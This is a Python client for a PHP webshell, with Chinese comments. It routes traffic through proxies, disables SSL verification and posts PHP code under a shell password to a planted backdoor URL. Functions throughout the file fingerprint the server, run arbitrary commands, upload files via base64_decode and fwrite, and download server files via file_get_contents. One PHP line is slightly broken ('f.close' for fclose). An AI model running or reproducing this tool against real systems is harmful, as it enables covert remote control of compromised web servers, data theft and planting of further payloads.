import base64
import requests
#屏蔽ssl认证告警
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import sys
import json
from urllib.parse import quote

#设置代理选项,写在最前面,让之后的流量都通过代理,放到开始界面那边去用
def set_proxy():
    proxy_list = read_json("./db/proxy.json")
    proxy_size = proxy_list[0]
    proxy_ip = proxy_list[1]
    proxy_port = proxy_list[2]
    if proxy_size == "HTTP代理":
        import os
        os.environ["http_proxy"] = f"http://{proxy_ip}:{proxy_port}"
    elif proxy_size == "HTTPS代理":
        import os
        os.environ["https_proxy"] = f"http://{proxy_ip}:{proxy_port}"
    elif proxy_size == "SOCKS5代理":
        import socket, socks
        socks.set_default_proxy(socks.SOCKS5, f"{proxy_ip}", int(proxy_port))
        socket.socket = socks.socksocket
    else:
        pass
    return proxy_size

#读取JSON文件拿到列表
def read_json(json_path):
    with open(f"{json_path}", "r", encoding="utf-8") as f:
        data = f.read()
    data_list = json.loads(data)
    return data_list

#将列表写入到JSON文件
def save_json(json_path, data_list):
    with open(f"{json_path}", mode="w", encoding="utf-8") as f:
        json.dump(data_list, f, indent=2, separators=(',', ':'), ensure_ascii=False)

#创建个连接请求
def cmd_conn(url, passwd, cmd):
    try:
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                   "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                         "Origin": f"{url}", "Content-Type": "application/x-www-form-urlencoded",
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                         "Referer": f"{url}", "Accept-Encoding": "gzip, deflate",
                         "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-HK;q=0.6,zh-TW;q=0.5",
                         "Connection": "close"}
        # 设置编码
        payload0 = {f'{passwd}':'echo PHP_OS;'}
        reqq_conn0 = requests.post(url, headers=headers, data=payload0, verify=False)
        if "WIN" not in reqq_conn0.text:
            encoding_size = 'utf-8'
        else:
            encoding_size = 'gbk'
        # payload = {f'{passwd}': f'{cmd}'}
        #
        payload = f'{passwd}={cmd}'.encode('GBK').decode('latin1')
        # payload = payload.encode('utf-8').decode("latin1")
        reqq_conn = requests.post(url, headers=headers, data=payload, verify=False)
        #设置编码
        reqq_conn.encoding = encoding_size
        return reqq_conn.text
    except Exception as e:
        print(e)
        return "FALSE"

def test_conn(url, passwd):
    try:
        # 先访问下有没有这个文件
        if requests.get(url).status_code == 200:
            res_list = []
            url = url.strip()
            passwd = passwd.strip()
            test_res = cmd_conn(url, passwd, "phpinfo();")
            flag = 'PHP Version'
            flag2 = 'disable_functions'
            # 判断是否连接成功
            if flag in test_res and flag2 in test_res:
                #连接成功的话就要执行命令获取更多信息了
                # ip_payload = get_ip()
                ip = cmd_conn(url, passwd, 'echo gethostbyname($_SERVER["SERVER_NAME"]);')
                # os_payload = get_os()
                os_size = cmd_conn(url, passwd, 'echo PHP_OS;')
                res_list.append(ip)
                res_list.append(os_size)
                return res_list
            else:
                return "NO"
        else:
            return "FALSE"
    except Exception as e:
        return "FALSE"

#文件上传时用的
def upload_conn(url, pwd, filename, filedata):
    headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "Origin": f"{url}", "Content-Type": "application/x-www-form-urlencoded",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
               "Referer": f"{url}", "Accept-Encoding": "gzip, deflate",
               "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-HK;q=0.6,zh-TW;q=0.5",
               "Connection": "close"}
    payload = {
        f'{pwd}': f"""header('Content-Type:text/html;charset=utf-8');
$fp = fopen('{filename}', 'w');fwrite($fp, base64_decode({filedata}));f.close($fp);"""}

    requests.post(url, headers=headers, data=payload, verify=False)

def upload_openfile(filename):
    try:
        with open(filename, 'rb') as f:
            filedata = f.read()
            return filedata
    except Exception as e:
        print(e)

#文件下载用
def download_conn(url, passwd, filename):
    try:
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                         "Origin": f"{url}", "Content-Type": "application/x-www-form-urlencoded",
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                         "Referer": f"{url}", "Accept-Encoding": "gzip, deflate",
                         "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-HK;q=0.6,zh-TW;q=0.5",
                         "Connection": "close"}

        payload = {f'{passwd}': f"header('Content-Type:text/html;charset=utf-8');$f = '{filename}';$filestring =file_get_contents($f); echo $filestring;"}
        reqq_conn = requests.post(url, headers=headers, data=payload, verify=False)

        if reqq_conn.status_code == 200:
            return reqq_conn.text
        else:
            return "False"
    except Exception as e:
        print(e)
        return "FALSE"
#下载完写文件
def download_openfile(download_path, data):
    try:
        with open(download_path, 'w', encoding="utf-8") as f:
            for i in data:
                f.write(i)
    except Exception as e:
        print(e)
